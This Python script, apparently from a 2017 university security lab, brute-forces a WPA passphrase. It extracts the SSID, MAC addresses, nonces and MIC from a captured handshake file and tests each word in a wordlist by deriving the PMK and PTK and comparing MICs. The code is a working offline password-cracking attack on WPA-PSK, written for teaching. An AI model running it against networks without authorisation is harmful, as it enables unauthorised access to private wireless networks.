#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Brute-force the WPA key from a WPA capture and a wordlist
"""

__author__ = "Arthur Bécaud et Bruno Egremy"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__status__ = "Prototype"

from wpa_key_derivation import customPRF512, getAssoReqInfo, getWPAKeyInfo
from binascii import b2a_hex
from scapy.all import *
from pbkdf2 import *
import hmac, hashlib

def main():
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("wpa_handshake.cap")

    # Get info from association request and WPA key packets
    ssid, APmac, Clientmac = getAssoReqInfo(wpa)
    ANonce, SNonce, mic_to_test, data = getWPAKeyInfo(wpa)

    A = "Pairwise key expansion"  # this string is used in the pseudo-random function
    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)  # used in pseudo-random function

    # Shows the values extracted from the capture
    print("\n\nValues used to derivate keys")
    print("============================")
    print("SSID: ", ssid, "\n")
    print("AP Mac: ", b2a_hex(APmac), "\n")
    print("CLient Mac: ", b2a_hex(Clientmac), "\n")
    print("AP Nonce: ", b2a_hex(ANonce), "\n")
    print("Client Nonce: ", b2a_hex(SNonce), "\n")

    # Prepare the ssid
    ssid = str.encode(ssid)

    # Read the wordlist
    print("\nTesting words")
    print("============================")
    words = open("wordlist", "r")
    # use 'read.splitlines()' to remove line return
    # https://docs.python.org/3/library/stdtypes.html#str.splitlines
    for word in words.read().splitlines():
        print("'" + word + "'")

        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(word)
        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

        # expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16], data, hashlib.sha1)

        # Compare the two MIC
        # Truncate 4 bytes from the hash because sha1 result with 20 bytes when only the first 16 are needed
        if mic_to_test == mic.digest()[:-4]:
            print("\nResults of the key expansion")
            print("=============================")
            print("word:\t\t", word, "\n")
            print("PTK:\t\t", ptk.hex(), "\n")  # expect: 908246499e0dd506a50be26f8bf8c3b912093b5ebc1f1768e1887db6e123015855b0b680ce2459ef02beefbbef427f863af01038e535b2233147ce6e9f742c5e
            print("PTK:\t\t", ptk.hex(), "\n")  # expect: 908246499e0dd506a50be26f8bf8c3b912093b5ebc1f1768e1887db6e123015855b0b680ce2459ef02beefbbef427f863af01038e535b2233147ce6e9f742c5e
            print("KCK:\t\t", ptk[0:16].hex(), "\n")
            print("KEK:\t\t", ptk[16:32].hex(), "\n")
            print("TK:\t\t", ptk[32:48].hex(), "\n")
            print("MICK:\t\t", ptk[48:64].hex(), "\n")
            print("MIC:\t\t", mic.hexdigest(), "\n")  # expect: 36eef66540fa801ceee2fea9b7929b40fdb0abaa
            break

if __name__ == '__main__':
    main()